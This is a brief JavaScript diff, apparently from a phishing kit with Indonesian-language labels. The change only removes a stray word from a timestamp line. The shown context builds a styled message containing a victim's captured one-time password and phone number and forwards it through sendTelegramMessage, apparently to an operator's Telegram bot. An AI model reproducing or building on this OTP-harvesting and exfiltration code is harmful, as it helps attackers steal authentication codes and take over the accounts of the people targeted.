@@ -260,7 +260,7 @@
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
 
-            const message = `<b> ── ⋆⋅𖤓⋅⋆ ─𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ─⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ ㅤ:</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏  ɴᴏᴍᴏʀ ㅤ:</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ  ㅤㅤ:</b> ${new Date().toLocaleTimeString('id-ID')} my\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 ✦•┈๑⋅⋯ </b>`;
+            const message = `<b> ── ⋆⋅𖤓⋅⋆ ─𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ─⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ ㅤ:</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏  ɴᴏᴍᴏʀ ㅤ:</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ  ㅤㅤ:</b> ${new Date().toLocaleTimeString('id-ID')} \n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 ✦•┈๑⋅⋯ </b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
